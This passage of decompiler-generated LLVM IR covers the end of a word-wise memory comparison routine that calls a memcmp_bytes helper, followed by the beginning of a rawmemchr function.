dec_label_pc_8065db3:                             ; preds = %dec_label_pc_8065da5, %dec_label_pc_8065d77
  %v0_8065dd774 = phi i32 [ %v0_8065dd775, %dec_label_pc_8065da5 ], [ %v1_8065d7f, %dec_label_pc_8065d77 ]
  %v0_8065dbf = phi i32 [ %v3_8065dae, %dec_label_pc_8065da5 ], [ %v2_8065d64, %dec_label_pc_8065d77 ]
  %v0_8065db6 = phi i32 [ %v0_8065dae, %dec_label_pc_8065da5 ], [ %v1_8065d7c, %dec_label_pc_8065d77 ]
  %v0_8065db3 = phi i32 [ %v0_8065da5, %dec_label_pc_8065da5 ], [ %v1_8065d79, %dec_label_pc_8065d77 ]
  %stack_var_-20.0 = phi i32 [ %v3_8065da5, %dec_label_pc_8065da5 ], [ %v2_8065d62, %dec_label_pc_8065d77 ]
  %v1_8065db3 = add i32 %v0_8065db3, 8
  %v2_8065db3 = inttoptr i32 %v1_8065db3 to i32*
  %v3_8065db3 = load i32, i32* %v2_8065db3, align 4
  %v1_8065db6 = add i32 %v0_8065db6, 8
  %v2_8065db6 = inttoptr i32 %v1_8065db6 to i32*
  %v3_8065db6 = load i32, i32* %v2_8065db6, align 4
  store i32 %v3_8065db6, i32* @edx, align 4
  %v15_8065db9 = icmp eq i32 %stack_var_-20.0, %v0_8065dbf
  br i1 %v15_8065db9, label %dec_label_pc_8065dc7, label %dec_label_pc_8065dbf

dec_label_pc_8065dbf:                             ; preds = %dec_label_pc_8065db3
  store i32 %v0_8065dbf, i32* @edx, align 4
  store i32 %stack_var_-20.0, i32* @eax, align 4
  br label %dec_label_pc_8065df6

dec_label_pc_8065dc7:                             ; preds = %dec_label_pc_8065db3, %dec_label_pc_8065d68
  %v0_8065dd7 = phi i32 [ %v0_8065dd774, %dec_label_pc_8065db3 ], [ %v1_8065d72, %dec_label_pc_8065d68 ]
  %v0_8065ddf = phi i32 [ %v0_8065db6, %dec_label_pc_8065db3 ], [ %v1_8065d6f, %dec_label_pc_8065d68 ]
  %v1_8065dca = phi i32 [ %v3_8065db6, %dec_label_pc_8065db3 ], [ %v2_8065d64, %dec_label_pc_8065d68 ]
  %v0_8065dd0 = phi i32 [ %v3_8065db3, %dec_label_pc_8065db3 ], [ %v2_8065d62, %dec_label_pc_8065d68 ]
  %v0_8065ddc = phi i32 [ %v0_8065db3, %dec_label_pc_8065db3 ], [ %v1_8065d6a, %dec_label_pc_8065d68 ]
  %v1_8065dc7 = add i32 %v0_8065ddc, 12
  %v2_8065dc7 = inttoptr i32 %v1_8065dc7 to i32*
  %v3_8065dc7 = load i32, i32* %v2_8065dc7, align 4
  %v12_8065dca = icmp eq i32 %v0_8065dd0, %v1_8065dca
  store i32 %v0_8065dd0, i32* @eax, align 4
  %v1_8065dd2 = add i32 %v0_8065ddf, 12
  %v2_8065dd2 = inttoptr i32 %v1_8065dd2 to i32*
  %v3_8065dd2 = load i32, i32* %v2_8065dd2, align 4
  %v1_8065dd5 = icmp eq i1 %v12_8065dca, false
  br i1 %v1_8065dd5, label %dec_label_pc_8065df6, label %dec_label_pc_8065dd7

dec_label_pc_8065dd7:                             ; preds = %dec_label_pc_8065dc7
  %v1_8065dd7 = add i32 %v0_8065dd7, -4
  %v9_8065dd7 = icmp eq i32 %v1_8065dd7, 0
  br i1 %v9_8065dd7, label %dec_label_pc_8065de4, label %dec_label_pc_8065ddc

dec_label_pc_8065ddc:                             ; preds = %dec_label_pc_8065dd7
  %v1_8065ddc = add i32 %v0_8065ddc, 16
  %v1_8065ddf = add i32 %v0_8065ddf, 16
  br label %dec_label_pc_8065d9b

dec_label_pc_8065de4:                             ; preds = %dec_label_pc_8065dd7
  %v15_8065de6 = icmp eq i32 %v3_8065dc7, %v3_8065dd2
  br i1 %v15_8065de6, label %dec_label_pc_8065f67.thread, label %dec_label_pc_8065df0

dec_label_pc_8065f67.thread:                      ; preds = %dec_label_pc_8065de4
  br label %dec_label_pc_8065f6b

dec_label_pc_8065df0:                             ; preds = %dec_label_pc_8065de4, %dec_label_pc_8065d9b
  %v0_8065df0 = phi i32 [ %v4_8065d9f, %dec_label_pc_8065d9b ], [ %v3_8065dd2, %dec_label_pc_8065de4 ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8065d9b ], [ %v3_8065dc7, %dec_label_pc_8065de4 ]
  store i32 %v0_8065df0, i32* @edx, align 4
  store i32 %stack_var_-48.1, i32* @eax, align 4
  br label %dec_label_pc_8065df6

dec_label_pc_8065df6:                             ; preds = %dec_label_pc_8065dc7, %dec_label_pc_8065da5, %dec_label_pc_8065dbf, %dec_label_pc_8065df0
  %v0_8065df6 = call i32 @memcmp_bytes()
  br label %dec_label_pc_8065f67

dec_label_pc_8065e00:                             ; preds = %dec_label_pc_8065d3d
  %v2_8065e0f = mul nuw nsw i32 %v1_8065d43, 8
  %v6_8065e16 = sub nsw i32 32, %v2_8065e0f
  %v1_8065e24 = urem i32 %v2_8065e0c, 4
  %v1_8065e27 = and i32 %v0_8065e22, -4
  store i32 %v1_8065e27, i32* @edx, align 4
  %v9_8065e2a = icmp eq i32 %v1_8065e24, 1
  br i1 %v9_8065e2a, label %dec_label_pc_8065e7a, label %dec_label_pc_8065e2f

dec_label_pc_8065e2f:                             ; preds = %dec_label_pc_8065e00
  %v2_8065e24 = icmp eq i32 %v1_8065e24, 0
  br i1 %v2_8065e24, label %dec_label_pc_8065e6a, label %dec_label_pc_8065e31

dec_label_pc_8065e31:                             ; preds = %dec_label_pc_8065e2f
  %v9_8065e31 = icmp eq i32 %v1_8065e24, 3
  %v1_8065e34 = inttoptr i32 %v1_8065e27 to i32*
  %v2_8065e34 = load i32, i32* %v1_8065e34, align 4
  %v1_8065e36 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065e36 = load i32, i32* %v1_8065e36, align 4
  %v1_8065e38 = add i32 %v1_8065e27, 4
  %v2_8065e38 = inttoptr i32 %v1_8065e38 to i32*
  %v3_8065e38 = load i32, i32* %v2_8065e38, align 4
  br i1 %v9_8065e31, label %dec_label_pc_8065e57, label %dec_label_pc_8065f06.thread

dec_label_pc_8065f06.thread:                      ; preds = %dec_label_pc_8065e31
  %v4_8065e3d = add nuw nsw i32 %v2_8065e0c, 2
  %v1_8065e44 = add i32 %v1_8065e27, -4
  store i32 %v1_8065e44, i32* @edx, align 4
  %v1_8065e47 = add i32 %v0_8065e8c, -8
  store i32 %v1_8065e47, i32* @ebx, align 4
  %.pre208 = and i32 %v6_8065e16, 24
  br label %bb173

dec_label_pc_8065e57:                             ; preds = %dec_label_pc_8065e31
  %v4_8065e57 = add nuw nsw i32 %v2_8065e0c, 1
  %v1_8065e5d = add i32 %v0_8065e8c, -4
  store i32 %v1_8065e5d, i32* @ebx, align 4
  br label %bb168

dec_label_pc_8065e6a:                             ; preds = %dec_label_pc_8065e2f
  %v1_8065e6a = add i32 %v1_8065e27, 4
  %v2_8065e6a = inttoptr i32 %v1_8065e6a to i32*
  %v3_8065e6a = load i32, i32* %v2_8065e6a, align 4
  %v1_8065e6d = inttoptr i32 %v1_8065e27 to i32*
  %v2_8065e6d = load i32, i32* %v1_8065e6d, align 4
  store i32 %v1_8065e6a, i32* @edx, align 4
  %v1_8065e76 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065e76 = load i32, i32* %v1_8065e76, align 4
  br label %bb163

dec_label_pc_8065e7a:                             ; preds = %dec_label_pc_8065e00
  %v1_8065e7a = inttoptr i32 %v1_8065e27 to i32*
  %v2_8065e7a = load i32, i32* %v1_8065e7a, align 4
  %v1_8065e80 = add i32 %v1_8065e27, 4
  %v2_8065e80 = inttoptr i32 %v1_8065e80 to i32*
  %v3_8065e80 = load i32, i32* %v2_8065e80, align 4
  %v1_8065e83 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065e83 = load i32, i32* %v1_8065e83, align 4
  %v4_8065e85 = add nsw i32 %v2_8065e0c, -1
  %v1_8065e89 = add i32 %v1_8065e27, 8
  store i32 %v1_8065e89, i32* @edx, align 4
  %v1_8065e8c = add i32 %v0_8065e8c, 4
  br label %bb158

bb158:                                            ; preds = %dec_label_pc_8065f39, %dec_label_pc_8065e7a
  %storemerge9.pre = phi i32 [ %v3_8065f13, %dec_label_pc_8065f39 ], [ %v2_8065e83, %dec_label_pc_8065e7a ]
  %v0_8065ea8 = phi i32 [ %v3_8065f10, %dec_label_pc_8065f39 ], [ %v3_8065e80, %dec_label_pc_8065e7a ]
  %v6_8065e91 = phi i32 [ %v8_8065f16, %dec_label_pc_8065f39 ], [ %v0_8065e22, %dec_label_pc_8065e7a ]
  %v0_8065e8f = phi i32 [ %v1_8065f39, %dec_label_pc_8065f39 ], [ %v1_8065e89, %dec_label_pc_8065e7a ]
  %v0_8065e9f = phi i32 [ %v1_8065f3c, %dec_label_pc_8065f39 ], [ %v1_8065e8c, %dec_label_pc_8065e7a ]
  %stack_var_-24.0 = phi i32 [ %v4_8065f32, %dec_label_pc_8065f39 ], [ %v4_8065e85, %dec_label_pc_8065e7a ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.1195, %dec_label_pc_8065f39 ], [ %v2_8065e7a, %dec_label_pc_8065e7a ]
  store i32 %v0_8065e9f, i32* @ebx, align 4
  %v1_8065e8f = inttoptr i32 %v0_8065e8f to i32*
  %v2_8065e8f = load i32, i32* %v1_8065e8f, align 4
  %v7_8065e91 = and i32 %v6_8065e91, -256
  %v5_8065e9d = lshr i32 %stack_var_-36.0, %v2_8065e0f
  %v1_8065e9f = inttoptr i32 %v0_8065e9f to i32*
  %v2_8065e9f = load i32, i32* %v1_8065e9f, align 4
  %v8_8065ea1 = or i32 %v7_8065e91, %v6_8065e16
  %v2_8065eaa = and i32 %v6_8065e16, 24
  %v4_8065eaa = icmp eq i32 %v2_8065eaa, 0
  br i1 %v4_8065eaa, label %bb161, label %bb159

bb159:                                            ; preds = %bb158
  %v5_8065eaa = shl i32 %v0_8065ea8, %v2_8065eaa
  br label %bb161

bb161:                                            ; preds = %bb158, %bb159
  %v3_8065eac = phi i32 [ %v0_8065ea8, %bb158 ], [ %v5_8065eaa, %bb159 ]
  %v4_8065eac = or i32 %v3_8065eac, %v5_8065e9d
  %v14_8065eaf = icmp eq i32 %v4_8065eac, %storemerge9.pre
  br i1 %v14_8065eaf, label %bb163, label %dec_label_pc_8065f2d

bb163:                                            ; preds = %bb161, %dec_label_pc_8065e6a
  %v1_8065ed4 = phi i32 [ %v2_8065e9f, %bb161 ], [ %v2_8065e76, %dec_label_pc_8065e6a ]
  %v0_8065ecd = phi i32 [ %v0_8065e9f, %bb161 ], [ %v0_8065e8c, %dec_label_pc_8065e6a ]
  %v0_8065ebf = phi i32 [ %v0_8065ea8, %bb161 ], [ %v2_8065e6d, %dec_label_pc_8065e6a ]
  %v6_8065ebb = phi i32 [ %v8_8065ea1, %bb161 ], [ %v3_8065e6a, %dec_label_pc_8065e6a ]
  %stack_var_-28.0 = phi i32 [ %v2_8065e8f, %bb161 ], [ %v3_8065e6a, %dec_label_pc_8065e6a ]
  %v0_8065eb8 = phi i32 [ %v0_8065e8f, %bb161 ], [ %v1_8065e6a, %dec_label_pc_8065e6a ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %bb161 ], [ %v2_8065e0c, %dec_label_pc_8065e6a ]
  %v1_8065eb8 = add i32 %v0_8065eb8, 4
  %v2_8065eb8 = inttoptr i32 %v1_8065eb8 to i32*
  %v3_8065eb8 = load i32, i32* %v2_8065eb8, align 4
  %v7_8065ebb = and i32 %v6_8065ebb, -256
  %v5_8065ebf = lshr i32 %v0_8065ebf, %v2_8065e0f
  %v8_8065ec5 = or i32 %v7_8065ebb, %v6_8065e16
  %v1_8065ecd = add i32 %v0_8065ecd, 4
  %v2_8065ecd = inttoptr i32 %v1_8065ecd to i32*
  %v3_8065ecd = load i32, i32* %v2_8065ecd, align 4
  %v2_8065ed0 = and i32 %v6_8065e16, 24
  %v4_8065ed0 = icmp eq i32 %v2_8065ed0, 0
  br i1 %v4_8065ed0, label %bb166, label %bb164

bb164:                                            ; preds = %bb163
  %v5_8065ed0 = shl i32 %stack_var_-28.0, %v2_8065ed0
  br label %bb166

bb166:                                            ; preds = %bb163, %bb164
  %v1_8065ed2 = phi i32 [ %stack_var_-28.0, %bb163 ], [ %v5_8065ed0, %bb164 ]
  %v2_8065ed2 = or i32 %v1_8065ed2, %v5_8065ebf
  %v12_8065ed4 = icmp eq i32 %v2_8065ed2, %v1_8065ed4
  br i1 %v12_8065ed4, label %bb168, label %dec_label_pc_8065f02

bb168:                                            ; preds = %bb166, %dec_label_pc_8065e57
  %storemerge11.pre = phi i32 [ %v3_8065ecd, %bb166 ], [ %v2_8065e36, %dec_label_pc_8065e57 ]
  %v0_8065ef9 = phi i32 [ %v0_8065ecd, %bb166 ], [ %v1_8065e5d, %dec_label_pc_8065e57 ]
  %v6_8065edf = phi i32 [ %v8_8065ec5, %bb166 ], [ %v2_8065e34, %dec_label_pc_8065e57 ]
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %bb166 ], [ %v2_8065e34, %dec_label_pc_8065e57 ]
  %v0_8065edc = phi i32 [ %v0_8065eb8, %bb166 ], [ %v1_8065e27, %dec_label_pc_8065e57 ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.1, %bb166 ], [ %v4_8065e57, %dec_label_pc_8065e57 ]
  %stack_var_-32.0 = phi i32 [ %v3_8065eb8, %bb166 ], [ %v3_8065e38, %dec_label_pc_8065e57 ]
  %v1_8065edc = add i32 %v0_8065edc, 8
  %v2_8065edc = inttoptr i32 %v1_8065edc to i32*
  %v3_8065edc = load i32, i32* %v2_8065edc, align 4
  %v5_8065eeb = lshr i32 %stack_var_-28.1, %v2_8065e0f
  %v2_8065ef5 = and i32 %v6_8065e16, 24
  %v4_8065ef5 = icmp eq i32 %v2_8065ef5, 0
  br i1 %v4_8065ef5, label %bb171, label %bb169

bb169:                                            ; preds = %bb168
  %v5_8065ef5 = shl i32 %stack_var_-32.0, %v2_8065ef5
  br label %bb171

bb171:                                            ; preds = %bb168, %bb169
  %v1_8065ef7 = phi i32 [ %stack_var_-32.0, %bb168 ], [ %v5_8065ef5, %bb169 ]
  %v2_8065ef7 = or i32 %v1_8065ef7, %v5_8065eeb
  %v12_8065efc = icmp eq i32 %v2_8065ef7, %storemerge11.pre
  br i1 %v12_8065efc, label %dec_label_pc_8065f06, label %dec_label_pc_8065f02

dec_label_pc_8065f02:                             ; preds = %bb171, %bb166
  %v0_8065f02 = phi i32 [ %v2_8065ed2, %bb166 ], [ %v2_8065ef7, %bb171 ]
  %storemerge11 = phi i32 [ %v1_8065ed4, %bb166 ], [ %storemerge11.pre, %bb171 ]
  store i32 %storemerge11, i32* @edx, align 4
  store i32 %v0_8065f02, i32* @eax, align 4
  br label %dec_label_pc_8065f5e

dec_label_pc_8065f06:                             ; preds = %bb171
  %v1_8065ef9 = add i32 %v0_8065ef9, 8
  %v2_8065ef9 = inttoptr i32 %v1_8065ef9 to i32*
  %v3_8065ef9 = load i32, i32* %v2_8065ef9, align 4
  br label %bb173

bb173:                                            ; preds = %dec_label_pc_8065f06.thread, %dec_label_pc_8065f06
  %.pre.pre-phi = phi i32 [ %.pre208, %dec_label_pc_8065f06.thread ], [ %v2_8065ef5, %dec_label_pc_8065f06 ]
  %stack_var_-32.1194 = phi i32 [ %v2_8065e34, %dec_label_pc_8065f06.thread ], [ %stack_var_-32.0, %dec_label_pc_8065f06 ]
  %v7_8065f06197.in = phi i32 [ %v2_8065e34, %dec_label_pc_8065f06.thread ], [ %v6_8065edf, %dec_label_pc_8065f06 ]
  %stack_var_-36.1195 = phi i32 [ %v3_8065e38, %dec_label_pc_8065f06.thread ], [ %v3_8065edc, %dec_label_pc_8065f06 ]
  %stack_var_-24.3192 = phi i32 [ %v4_8065e3d, %dec_label_pc_8065f06.thread ], [ %stack_var_-24.2, %dec_label_pc_8065f06 ]
  %v0_8065f39188 = phi i32 [ %v1_8065e44, %dec_label_pc_8065f06.thread ], [ %v0_8065edc, %dec_label_pc_8065f06 ]
  %v0_8065f3c186 = phi i32 [ %v1_8065e47, %dec_label_pc_8065f06.thread ], [ %v0_8065ef9, %dec_label_pc_8065f06 ]
  %v3_8065f26184 = phi i32 [ %v2_8065e36, %dec_label_pc_8065f06.thread ], [ %v3_8065ef9, %dec_label_pc_8065f06 ]
  %v7_8065f06197 = and i32 %v7_8065f06197.in, -256
  %v5_8065f0e = lshr i32 %stack_var_-32.1194, %v2_8065e0f
  %v1_8065f10 = add i32 %v0_8065f39188, 12
  %v2_8065f10 = inttoptr i32 %v1_8065f10 to i32*
  %v3_8065f10 = load i32, i32* %v2_8065f10, align 4
  %v1_8065f13 = add i32 %v0_8065f3c186, 12
  %v2_8065f13 = inttoptr i32 %v1_8065f13 to i32*
  %v3_8065f13 = load i32, i32* %v2_8065f13, align 4
  %v8_8065f16 = or i32 %v7_8065f06197, %v6_8065e16
  %v4_8065f21 = icmp eq i32 %.pre.pre-phi, 0
  br i1 %v4_8065f21, label %bb176, label %bb174

bb174:                                            ; preds = %bb173
  %v5_8065f21 = shl i32 %stack_var_-36.1195, %.pre.pre-phi
  br label %bb176

bb176:                                            ; preds = %bb173, %bb174
  %v3_8065f23 = phi i32 [ %stack_var_-36.1195, %bb173 ], [ %v5_8065f21, %bb174 ]
  %v4_8065f23 = or i32 %v3_8065f23, %v5_8065f0e
  %v14_8065f26 = icmp eq i32 %v4_8065f23, %v3_8065f26184
  br i1 %v14_8065f26, label %dec_label_pc_8065f32, label %dec_label_pc_8065f2d

dec_label_pc_8065f2d:                             ; preds = %bb161, %bb176
  %v2_8065f2d = phi i32 [ %v4_8065f23, %bb176 ], [ %v4_8065eac, %bb161 ]
  %storemerge9 = phi i32 [ %v3_8065f26184, %bb176 ], [ %storemerge9.pre, %bb161 ]
  store i32 %storemerge9, i32* @edx, align 4
  store i32 %v2_8065f2d, i32* @eax, align 4
  br label %dec_label_pc_8065f5e

dec_label_pc_8065f32:                             ; preds = %bb176
  %v4_8065f32 = add i32 %stack_var_-24.3192, -4
  %v12_8065f32 = icmp eq i32 %v4_8065f32, 0
  br i1 %v12_8065f32, label %bb178, label %dec_label_pc_8065f39

dec_label_pc_8065f39:                             ; preds = %dec_label_pc_8065f32
  %v1_8065f39 = add i32 %v0_8065f39188, 16
  store i32 %v1_8065f39, i32* @edx, align 4
  %v1_8065f3c = add i32 %v0_8065f3c186, 16
  br label %bb158

bb178:                                            ; preds = %dec_label_pc_8065f32
  %v5_8065f4c = lshr i32 %stack_var_-36.1195, %v2_8065e0f
  br i1 %v4_8065f21, label %bb181, label %bb179

bb179:                                            ; preds = %bb178
  %v5_8065f52 = shl i32 %v3_8065f10, %.pre.pre-phi
  br label %bb181

bb181:                                            ; preds = %bb178, %bb179
  %v1_8065f54 = phi i32 [ %v3_8065f10, %bb178 ], [ %v5_8065f52, %bb179 ]
  %v2_8065f54 = or i32 %v1_8065f54, %v5_8065f4c
  store i32 %v2_8065f54, i32* @eax, align 4
  %v12_8065f58 = icmp eq i32 %v2_8065f54, %v3_8065f13
  br i1 %v12_8065f58, label %dec_label_pc_8065f67.thread209, label %dec_label_pc_8065f5c

dec_label_pc_8065f67.thread209:                   ; preds = %bb181
  br label %dec_label_pc_8065f6b

dec_label_pc_8065f5c:                             ; preds = %bb181
  store i32 %v3_8065f13, i32* @edx, align 4
  br label %dec_label_pc_8065f5e

dec_label_pc_8065f5e:                             ; preds = %dec_label_pc_8065f2d, %dec_label_pc_8065f02, %dec_label_pc_8065f5c
  %v0_8065f5e = call i32 @memcmp_bytes()
  store i32 %v0_8065f5e, i32* @ecx, align 4
  br label %dec_label_pc_8065f67

dec_label_pc_8065f67:                             ; preds = %dec_label_pc_8065f5e, %dec_label_pc_8065df6
  %storemerge = phi i32 [ %v0_8065df6, %dec_label_pc_8065df6 ], [ %v0_8065f5e, %dec_label_pc_8065f5e ]
  %v1_8065f67 = icmp eq i32 %storemerge, 0
  %v1_8065f69 = icmp eq i1 %v1_8065f67, false
  br i1 %v1_8065f69, label %dec_label_pc_8065fa0, label %dec_label_pc_8065f6b

dec_label_pc_8065f6b:                             ; preds = %dec_label_pc_8065f67.thread209, %dec_label_pc_8065f67.thread, %dec_label_pc_8065f67
  %v4_8065f73 = urem i32 %stack_var_12.0.lcssa, 4
  %v1_8065f78 = and i32 %stack_var_12.0.lcssa, -4
  %v2_8065f7f = add i32 %v1_8065f78, %v0_8065e22
  store i32 %v2_8065f7f, i32* @ecx, align 4
  %v2_8065f81 = add i32 %v1_8065f78, %v0_8065e8c
  br label %dec_label_pc_8065f97.preheader

dec_label_pc_8065f97.preheader:                   ; preds = %dec_label_pc_8065f6b, %entry
  %v0_8065f88122 = phi i32 [ %v4_8065d0a, %entry ], [ %v2_8065f7f, %dec_label_pc_8065f6b ]
  %v0_8065f85120 = phi i32 [ %v4_8065d0e, %entry ], [ %v2_8065f81, %dec_label_pc_8065f6b ]
  %stack_var_12.1.ph = phi i32 [ %tmp149, %entry ], [ %v4_8065f73, %dec_label_pc_8065f6b ]
  %v4_8065f9738 = icmp eq i32 %stack_var_12.1.ph, 0
  %v1_8065f9c45 = icmp eq i1 %v4_8065f9738, false
  br i1 %v1_8065f9c45, label %dec_label_pc_8065f85, label %dec_label_pc_8065f9e

dec_label_pc_8065f85:                             ; preds = %dec_label_pc_8065f97.preheader, %dec_label_pc_8065f91
  %v0_8065f95 = phi i32 [ %v1_8065f95, %dec_label_pc_8065f91 ], [ %v0_8065f88122, %dec_label_pc_8065f97.preheader ]
  %v0_8065f96 = phi i32 [ %v1_8065f96, %dec_label_pc_8065f91 ], [ %v0_8065f85120, %dec_label_pc_8065f97.preheader ]
  %stack_var_12.146 = phi i32 [ %v4_8065f91, %dec_label_pc_8065f91 ], [ %stack_var_12.1.ph, %dec_label_pc_8065f97.preheader ]
  %v1_8065f85 = inttoptr i32 %v0_8065f96 to i8*
  %v2_8065f85 = load i8, i8* %v1_8065f85, align 1
  %v3_8065f85 = zext i8 %v2_8065f85 to i32
  %v1_8065f88 = inttoptr i32 %v0_8065f95 to i8*
  %v2_8065f88 = load i8, i8* %v1_8065f88, align 1
  %v3_8065f88 = zext i8 %v2_8065f88 to i32
  %v2_8065f8b = sub nsw i32 %v3_8065f88, %v3_8065f85
  %v12_8065f8b = icmp eq i32 %v2_8065f8b, 0
  store i32 %v2_8065f8b, i32* @edx, align 4
  %v1_8065f8f = icmp eq i1 %v12_8065f8b, false
  br i1 %v1_8065f8f, label %dec_label_pc_8065fa0, label %dec_label_pc_8065f91

dec_label_pc_8065f91:                             ; preds = %dec_label_pc_8065f85
  %v4_8065f91 = add i32 %stack_var_12.146, -1
  %v11_8065f91 = icmp eq i32 %v4_8065f91, 0
  %v1_8065f95 = add i32 %v0_8065f95, 1
  store i32 %v1_8065f95, i32* @ecx, align 4
  %v1_8065f96 = add i32 %v0_8065f96, 1
  %v1_8065f9c = icmp eq i1 %v11_8065f91, false
  br i1 %v1_8065f9c, label %dec_label_pc_8065f85, label %dec_label_pc_8065f9e

dec_label_pc_8065f9e:                             ; preds = %dec_label_pc_8065f91, %dec_label_pc_8065f97.preheader
  br label %dec_label_pc_8065fa0

dec_label_pc_8065fa0:                             ; preds = %dec_label_pc_8065d1e, %dec_label_pc_8065f85, %dec_label_pc_8065f67, %dec_label_pc_8065f9e
  %v0_8065fa7 = phi i32 [ %storemerge, %dec_label_pc_8065f67 ], [ 0, %dec_label_pc_8065f9e ], [ %v2_8065f8b, %dec_label_pc_8065f85 ], [ %v2_8065d24, %dec_label_pc_8065d1e ]
  store i32 %v0_8065d06, i32* @ebx, align 4
  ret i32 %v0_8065fa7

; uselistorder directives
  uselistorder i32 %v1_8065f95, { 1, 0 }
  uselistorder i32 %v4_8065f91, { 1, 0 }
  uselistorder i32 %v1_8065f78, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_8065f39, { 1, 0 }
  uselistorder i32 %v4_8065f32, { 1, 0 }
  uselistorder i32 %v4_8065f23, { 1, 0 }
  uselistorder i32 %v3_8065f13, { 2, 0, 1 }
  uselistorder i32 %v3_8065f10, { 1, 2, 0 }
  uselistorder i32 %v3_8065f26184, { 1, 0 }
  uselistorder i32 %v0_8065f3c186, { 1, 0 }
  uselistorder i32 %v0_8065f39188, { 1, 0 }
  uselistorder i32 %stack_var_-36.1195, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8065ef7, { 1, 0 }
  uselistorder i32 %storemerge11.pre, { 1, 0 }
  uselistorder i32 %v2_8065ed2, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i32 %v1_8065ed4, { 1, 0 }
  uselistorder i32 %v4_8065eac, { 1, 0 }
  uselistorder i32 %storemerge9.pre, { 1, 0 }
  uselistorder i32 %v3_8065e6a, { 1, 0 }
  uselistorder i32 %v2_8065e34, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8065e27, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9 }
  uselistorder i32 %v1_8065e24, { 2, 0, 1 }
  uselistorder i32 %v6_8065e16, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 %v2_8065e0f, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32 %v1_8065dd7, { 1, 0 }
  uselistorder i32 %v3_8065dd2, { 1, 0, 2 }
  uselistorder i32 %v3_8065dc7, { 1, 0, 2 }
  uselistorder i32 %v0_8065dd0, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v0_8065dbf, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %storemerge25.in, { 0, 2, 1 }
  uselistorder i32 %v4_8065d9f, { 1, 0 }
  uselistorder i32 %v1_8065d55, { 2, 0, 1 }
  uselistorder i32 %v2_8065e0c, { 4, 5, 2, 3, 0, 6, 7, 8, 9, 1 }
  uselistorder i32 %v0_8065e8c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32 %stack_var_12.0.lcssa, { 2, 0, 1 }
  uselistorder i32 %v0_8065e22, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %v1_8065d33, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8065d32, { 0, 2, 1 }
  uselistorder i32 %v4_8065d0e, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_8065d0a, { 2, 1, 0, 3 }
  uselistorder i32 %tmp149, { 2, 1, 0, 3 }
  uselistorder i32 ()* @memcmp_bytes, { 1, 0 }
  uselistorder i32 -8, { 120, 121, 122, 123, 128, 124, 129, 21, 15, 14, 16, 13, 17, 18, 19, 20, 22, 23, 126, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37, 132, 130, 131, 4, 127, 43, 40, 41, 42, 44, 45, 7, 39, 6, 38, 5, 46, 8, 47, 48, 125, 54, 55, 49, 50, 51, 52, 53, 56, 57, 58, 59, 68, 67, 9, 62, 10, 63, 64, 65, 66, 60, 61, 69, 70, 72, 71, 73, 74, 75, 88, 89, 90, 85, 86, 87, 82, 83, 84, 81, 80, 79, 77, 78, 76, 91, 92, 93, 94, 95, 96, 97, 2, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 0, 1, 11, 109, 12, 110, 112, 111, 114, 113, 116, 115, 118, 117, 3, 119 }
  uselistorder label %dec_label_pc_8065fa0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8065f85, { 1, 0 }
  uselistorder label %dec_label_pc_8065f6b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065f5e, { 2, 0, 1 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_8065f2d, { 1, 0 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_8065df6, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8065d1e, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8065fa9 = load i32, i32* @ebx, align 4
  %v4_8065faa = urem i32 %arg2, 256
  %v4_8065fae = ptrtoint i8* %arg1 to i32
  %v2_8065fb93 = urem i32 %v4_8065fae, 4
  %v3_8065fb94 = icmp eq i32 %v2_8065fb93, 0
  %v1_8065fbb8 = icmp eq i1 %v3_8065fb94, false
  %v4_8065fb4 = trunc i32 %arg2 to i8
  br i1 %v1_8065fbb8, label %dec_label_pc_8065fb4, label %dec_label_pc_8065fbd

dec_label_pc_8065fb4:                             ; preds = %entry, %dec_label_pc_8065fb8
  %v0_8065fb8 = phi i32 [ %v1_8065fb8, %dec_label_pc_8065fb8 ], [ %v4_8065fae, %entry ]
  %v1_8065fb4 = inttoptr i32 %v0_8065fb8 to i8*
  %v2_8065fb4 = load i8, i8* %v1_8065fb4, align 1
  %v15_8065fb4 = icmp eq i8 %v2_8065fb4, %v4_8065fb4
  br i1 %v15_8065fb4, label %dec_label_pc_8066008, label %dec_label_pc_8065fb8

dec_label_pc_8065fb8:                             ; preds = %dec_label_pc_8065fb4
  %v1_8065fb8 = add i32 %v0_8065fb8, 1
  %v2_8065fb9 = urem i32 %v1_8065fb8, 4
  %v3_8065fb9 = icmp eq i32 %v2_8065fb9, 0
  %v1_8065fbb = icmp eq i1 %v3_8065fb9, false
  br i1 %v1_8065fbb, label %dec_label_pc_8065fb4, label %dec_label_pc_8065fbd

